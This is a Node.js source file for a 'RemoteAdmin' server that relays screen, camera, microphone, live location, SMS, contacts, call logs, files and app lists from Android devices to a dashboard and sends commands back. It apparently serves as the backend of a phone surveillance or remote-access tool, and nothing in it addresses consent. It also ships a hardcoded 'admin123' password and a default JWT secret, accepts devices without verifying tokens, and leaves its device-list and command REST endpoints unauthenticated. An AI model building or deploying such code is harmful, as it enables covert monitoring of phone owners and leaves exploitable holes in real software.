/**
 * RemoteAdmin Signaling Server
 *
 * Handles:
 * - WebSocket connections from Android devices and web dashboard
 * - Authentication via JWT tokens
 * - WebRTC signaling (SDP offer/answer, ICE candidates)
 * - Screen frame relay (binary)
 * - Camera/audio data relay (binary)
 * - Command routing (dashboard → device)
 * - Device status tracking
 * - Location data relay from device to dashboard
 */

require('dotenv').config();
const express = require('express');
const http = require('http');
const { WebSocketServer, WebSocket } = require('ws');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const server = http.createServer(app);

// ─── Configuration ────────────────────────────────────────────────────────

const PORT = process.env.PORT || 3001;
const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-change-in-production';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const CORS_ORIGIN = process.env.CORS_ORIGIN || 'http://localhost:3000';

// ─── Middleware ────────────────────────────────────────────────────────────

app.use(helmet());
app.use(cors({ origin: CORS_ORIGIN, credentials: true }));
app.use(express.json());

// ─── In-Memory State ──────────────────────────────────────────────────────

/**
 * Connected devices: deviceId → { ws, deviceInfo, status, lastSeen }
 */
const devices = new Map();

/**
 * Active dashboard sessions: sessionId → { ws, deviceId, authenticated }
 */
const dashboardSessions = new Map();

// ─── REST API ─────────────────────────────────────────────────────────────

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', devices: devices.size, sessions: dashboardSessions.size });
});

/**
 * Dashboard login - returns JWT token
 */
app.post('/api/auth/login', (req, res) => {
  const { password, deviceId } = req.body;

  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Invalid password' });
  }

  const token = jwt.sign(
    { role: 'dashboard', deviceId: deviceId || 'any', iat: Date.now() },
    JWT_SECRET,
    { expiresIn: '24h' }
  );

  res.json({ token, expiresIn: '24h' });
});

/**
 * List connected devices
 */
app.get('/api/devices', (req, res) => {
  const deviceList = [];
  for (const [id, device] of devices) {
    deviceList.push({
      deviceId: id,
      deviceInfo: device.deviceInfo || {},
      status: device.status || {},
      connected: device.ws.readyState === WebSocket.OPEN,
      lastSeen: device.lastSeen,
    });
  }
  res.json(deviceList);
});

/**
 * Send command to a device via REST (alternative to WebSocket)
 */
app.post('/api/devices/:deviceId/command', (req, res) => {
  const { deviceId } = req.params;
  const { action, payload } = req.body;

  const device = devices.get(deviceId);
  if (!device || device.ws.readyState !== WebSocket.OPEN) {
    return res.status(404).json({ error: 'Device not connected' });
  }

  const command = {
    type: 'command',
    payload: { action, ...payload },
  };

  device.ws.send(JSON.stringify(command));
  res.json({ sent: true });
});

// ─── WebSocket Server ─────────────────────────────────────────────────────

const wss = new WebSocketServer({ server, path: '/ws' });

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const deviceId = url.searchParams.get('deviceId');
  const token = url.searchParams.get('token');
  const role = url.searchParams.get('role'); // 'device' or 'dashboard'

  console.log(`[WS] New connection: device=${deviceId}, role=${role}`);

  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });

  // ─── Device Connection ───────────────────────────────────────────────────

  if (deviceId && !role || role === 'device') {
    handleDeviceConnection(ws, deviceId, token);
    return;
  }

  // ─── Dashboard Connection ────────────────────────────────────────────────

  if (role === 'dashboard' || (!deviceId && token)) {
    handleDashboardConnection(ws, token);
    return;
  }

  // Fallback: treat as dashboard
  handleDashboardConnection(ws, token);
});

// ─── Device Handlers ──────────────────────────────────────────────────────

function handleDeviceConnection(ws, deviceId, token) {
  const sessionId = uuidv4();

  // Register device
  const deviceEntry = {
    ws,
    deviceId,
    sessionId,
    deviceInfo: {},
    status: {
      screenCapture: false,
      camera: false,
      mic: false,
      accessibility: false,
    },
    authenticated: false,
    lastSeen: Date.now(),
  };

  devices.set(deviceId, deviceEntry);

  ws.on('message', (data, isBinary) => {
    deviceEntry.lastSeen = Date.now();

    if (isBinary) {
      handleDeviceBinaryMessage(ws, deviceId, data);
      return;
    }

    const message = data.toString();
    try {
      const json = JSON.parse(message);
      handleDeviceJsonMessage(ws, deviceId, json);
    } catch (e) {
      console.error(`[Device] Invalid message from ${deviceId}:`, e.message);
    }
  });

  ws.on('close', () => {
    console.log(`[Device] ${deviceId} disconnected`);
    devices.delete(deviceId);
    notifyDashboardDeviceDisconnected(deviceId);
  });

  ws.on('error', (err) => {
    console.error(`[Device] ${deviceId} error:`, err.message);
  });

  console.log(`[Device] ${deviceId} registered, waiting for auth`);
}

function handleDeviceJsonMessage(ws, deviceId, message) {
  const device = devices.get(deviceId);
  if (!device) return;

  switch (message.type) {
    case 'auth':
      // Simple device auth (token-based in production)
      device.authenticated = true;
      device.deviceInfo = message.deviceInfo || {};
      device.connectedAt = Date.now();
      ws.send(JSON.stringify({ type: 'auth_success' }));
      console.log(`[Device] ${deviceId} authenticated`, message.deviceInfo?.deviceName || '');
      notifyDashboardDeviceConnected(deviceId, device);
      break;

    case 'status':
      device.status = { ...device.status, ...message };
      // Forward status to connected dashboards
      broadcastToDeviceDashboards(deviceId, {
        type: 'status',
        deviceId,
        ...device.status,
      });
      break;

    case 'location':
      // Location data from device → forward to dashboards
      broadcastToDeviceDashboards(deviceId, {
        type: 'location',
        deviceId,
        latitude: message.latitude,
        longitude: message.longitude,
        accuracy: message.accuracy,
        speed: message.speed,
        altitude: message.altitude,
        timestamp: message.timestamp,
        provider: message.provider,
      });
      console.log(`[Device] ${deviceId} location: ${message.latitude?.toFixed(4)}, ${message.longitude?.toFixed(4)}`);
      break;

    case 'pong':
      // Heartbeat response
      break;

    // ─── Data Responses ──────────────────────────────────────────────────
    case 'contacts':
    case 'sms':
    case 'callLogs':
    case 'files':
    case 'deviceInfo':
    case 'installedApps':
    case 'uiTree':
    case 'fileDownload':
    case 'deleteResult':
      // Forward data to all dashboards watching this device
      broadcastToDeviceDashboards(deviceId, { ...message, deviceId });
      break;

    case 'error':
      console.error(`[Device] ${deviceId} reports error:`, message.message);
      broadcastToDeviceDashboards(deviceId, { ...message, deviceId });
      break;

    default:
      // Forward unknown messages to dashboards
      broadcastToDeviceDashboards(deviceId, { ...message, deviceId });
  }
}

function handleDeviceBinaryMessage(ws, deviceId, data) {
  const device = devices.get(deviceId);
  if (!device || !device.authenticated) return;

  // Binary messages are forwarded to connected dashboards as-is
  // The preceding JSON message identifies the type (screenFrame, cameraFrame, audioData)
  broadcastToDeviceDashboardsBinary(deviceId, data);
}

// ─── Dashboard Handlers ───────────────────────────────────────────────────

function handleDashboardConnection(ws, token) {
  const sessionId = uuidv4();

  // Verify JWT token
  let decoded;
  try {
    decoded = jwt.verify(token, JWT_SECRET);
  } catch (e) {
    ws.send(JSON.stringify({ type: 'auth_failure', error: 'Invalid token' }));
    ws.close();
    return;
  }

  const session = {
    ws,
    sessionId,
    targetDeviceId: decoded.deviceId || 'any',
    authenticated: true,
  };

  dashboardSessions.set(sessionId, session);
  console.log(`[Dashboard] Session ${sessionId} authenticated`);

  // Send connected devices list
  const deviceList = [];
  for (const [id, device] of devices) {
    if (device.authenticated) {
      deviceList.push({
        deviceId: id,
        deviceName: device.deviceInfo?.deviceName || id,
        deviceInfo: device.deviceInfo,
        status: device.status,
        connectedAt: device.connectedAt || Date.now(),
        lastLocation: device.lastLocation || null,
      });
    }
  }
  ws.send(JSON.stringify({ type: 'devices', devices: deviceList }));

  ws.on('message', (data, isBinary) => {
    if (isBinary) {
      handleDashboardBinaryMessage(sessionId, data);
      return;
    }

    try {
      const message = JSON.parse(data.toString());
      handleDashboardJsonMessage(sessionId, message);
    } catch (e) {
      console.error(`[Dashboard] Invalid message:`, e.message);
    }
  });

  ws.on('close', () => {
    console.log(`[Dashboard] Session ${sessionId} disconnected`);
    dashboardSessions.delete(sessionId);
  });

  ws.on('error', (err) => {
    console.error(`[Dashboard] Session ${sessionId} error:`, err.message);
  });
}

function handleDashboardJsonMessage(sessionId, message) {
  const session = dashboardSessions.get(sessionId);
  if (!session || !session.authenticated) return;

  switch (message.type) {
    case 'command':
      // Route command to target device
      routeCommandToDevice(message.targetDeviceId || session.targetDeviceId, message.payload);
      break;

    case 'switchDevice':
      session.targetDeviceId = message.deviceId;
      console.log(`[Dashboard] ${sessionId} switched to device ${message.deviceId}`);
      break;

    case 'getDevices':
      // Refresh device list
      const deviceList = [];
      for (const [id, device] of devices) {
        if (device.authenticated) {
          deviceList.push({
            deviceId: id,
            deviceName: device.deviceInfo?.deviceName || id,
            deviceInfo: device.deviceInfo,
            status: device.status,
            connectedAt: device.connectedAt || Date.now(),
            lastLocation: device.lastLocation || null,
          });
        }
      }
      session.ws.send(JSON.stringify({ type: 'devices', devices: deviceList }));
      break;

    case 'ping':
      session.ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
      break;

    // ─── WebRTC Signaling ──────────────────────────────────────────────
    case 'webrtc_offer':
    case 'webrtc_answer':
    case 'webrtc_ice':
      // Forward WebRTC signaling to device with session tracking
      const targetDev = message.targetDeviceId || session.targetDeviceId;
      console.log(`[WebRTC] Relaying ${message.type} → device ${targetDev}`);
      routeSignalToDevice(targetDev, {
        ...message,
        sessionId,
      });
      break;

    default:
      console.log(`[Dashboard] Unknown message type: ${message.type}`);
  }
}

function handleDashboardBinaryMessage(sessionId, data) {
  const session = dashboardSessions.get(sessionId);
  if (!session) return;

  // Forward binary data (e.g., file uploads) to device
  const deviceId = session.targetDeviceId;
  if (deviceId && deviceId !== 'any') {
    const device = devices.get(deviceId);
    if (device && device.ws.readyState === WebSocket.OPEN) {
      device.ws.send(data, { binary: true });
    }
  }
}

// ─── Routing Helpers ──────────────────────────────────────────────────────

function routeCommandToDevice(deviceId, payload) {
  if (!deviceId || deviceId === 'any') {
    // Send to first available device
    for (const [id, device] of devices) {
      if (device.authenticated && device.ws.readyState === WebSocket.OPEN) {
        deviceId = id;
        break;
      }
    }
  }

  if (!deviceId) return;

  const device = devices.get(deviceId);
  if (!device || device.ws.readyState !== WebSocket.OPEN) {
    console.warn(`[Route] Device ${deviceId} not available`);
    return;
  }

  const command = {
    type: 'command',
    payload,
  };

  device.ws.send(JSON.stringify(command));
  console.log(`[Route] Command "${payload.action}" → device ${deviceId}`);
}

function routeSignalToDevice(deviceId, message) {
  if (!deviceId || deviceId === 'any') return;

  const device = devices.get(deviceId);
  if (device && device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(JSON.stringify(message));
  }
}

function broadcastToDeviceDashboards(deviceId, message) {
  const payload = JSON.stringify(message);
  for (const [, session] of dashboardSessions) {
    if (session.authenticated
        && session.ws.readyState === WebSocket.OPEN
        && (session.targetDeviceId === deviceId || session.targetDeviceId === 'any')) {
      session.ws.send(payload);
    }
  }
}

function broadcastToDeviceDashboardsBinary(deviceId, data) {
  for (const [, session] of dashboardSessions) {
    if (session.authenticated
        && session.ws.readyState === WebSocket.OPEN
        && (session.targetDeviceId === deviceId || session.targetDeviceId === 'any')) {
      session.ws.send(data, { binary: true });
    }
  }
}

function notifyDashboardDeviceConnected(deviceId, device) {
  broadcastToDeviceDashboards(deviceId, {
    type: 'deviceConnected',
    deviceId,
    deviceName: device.deviceInfo?.deviceName || deviceId,
    deviceInfo: device.deviceInfo,
    status: device.status,
    connectedAt: device.connectedAt || Date.now(),
  });
}

function notifyDashboardDeviceDisconnected(deviceId) {
  broadcastToDeviceDashboards(deviceId, {
    type: 'deviceDisconnected',
    deviceId,
  });
}

// ─── Heartbeat ────────────────────────────────────────────────────────────

const heartbeatInterval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (!ws.isAlive) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);

// ─── Start Server ─────────────────────────────────────────────────────────

server.listen(PORT, () => {
  console.log(`
  ┌───────────────────────────────────────────┐
  │  RemoteAdmin Signaling Server             │
  │  Port: ${PORT}                              │
  │  WebSocket: ws://localhost:${PORT}/ws        │
  │  Health: http://localhost:${PORT}/api/health  │
  └───────────────────────────────────────────┘
  `);
});

wss.on('close', () => {
  clearInterval(heartbeatInterval);
});

module.exports = { app, server, wss };
